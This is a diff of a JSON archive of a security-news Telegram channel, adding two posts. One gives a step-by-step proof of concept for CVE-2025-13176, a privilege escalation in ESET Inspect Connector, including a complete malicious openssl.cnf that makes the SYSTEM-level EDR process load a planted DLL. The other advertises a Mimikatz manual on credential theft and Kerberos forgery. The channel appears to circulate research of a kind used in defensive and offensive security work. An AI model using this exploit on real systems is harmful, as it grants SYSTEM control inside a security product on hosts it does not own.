@@ -1,8 +1,22 @@
 {
   "channel": "P0x3k_1N73LL1G3NC3",
-  "last_update": "2026-02-18T05:25:49.441401+00:00",
-  "messages_count": 101,
+  "last_update": "2026-02-18T09:57:47.275340+00:00",
+  "messages_count": 103,
   "messages": [
+    {
+      "id": "273",
+      "title": "CVE-2025-13176: Local Privilege Escalation in ESET Inspect EDR",
+      "text": "CVE-2025-13176: Local Privilege Escalation in ESET Inspect EDR\nLPE vulnerability in the ESET Inspect Connector for Windows (versions prior to 3.0.5765) due to the ElConnector.exe process (running as SYSTEM) attempting to load an OpenSSL configuration file from a non-existent path that can be created by a low-privileged user\nPoC:\n1) Create the directory: C:\\src\\vcpkg\\packages\\openssl_x64-windows-static\\\n2) Place a malicious DLL (e.g., woot.dll) in that directory.\n3) Create an openssl.cnf file in that directory with the following content:\n# Malicious openssl.cnf\nopenssl_conf = openssl_init\n[openssl_init]\nengines = engine_section\n[engine_section]\ncmd = cmd_section\n[cmd_section]\nengine_id = cmd\ndynamic_path = C:\\\\src\\\\vcpkg\\\\packages\\\\openssl_x64-windows-static\\\\woot.dll\ninit = 0\n4) Wait for the ESET Inspect Connector service to restart or trigger an OpenSSL initialization.\n5) The woot.dll is loaded inside the EDR’s process and executed as SYSTEM. There is no signing requirement for DLLs in this process.\n\n[Media: Фото]",
+      "link": "https://t.me/P0x3k_1N73LL1G3NC3/273",
+      "pub_date": "2026-02-18T09:02:01+00:00"
+    },
+    {
+      "id": "272",
+      "title": "The Mimikatz Missing Manual",
+      "text": "The Mimikatz Missing Manual\nMy goal was to create the \"Missing Manual\" — the documentation that explains not just the commands, but the why and the how of the Windows protocols being manipulated.\nParts:\n• Foundations: Setting up your environment and the basic syntax.\n• System Internals: How Windows handles tokens, processes, and services.\n• LSASS & Credentials: The heart of Mimikatz—extracting secrets from memory.\n• Kerberos Deep Dive: Tickets, forgery, and delegation.\n• PKI & Certificates: Hardware and software-based identities.\n• Domain Persistence: Owning the directory through replication.\n•DPAPI: Unlocking the secrets at rest.\n\n[Media: Фото]",
+      "link": "https://t.me/P0x3k_1N73LL1G3NC3/272",
+      "pub_date": "2026-02-18T06:07:11+00:00"
+    },
     {
       "id": "271",
       "title": "Форк популярного скрипта ldapdomaindump, но только работает с ADWS",
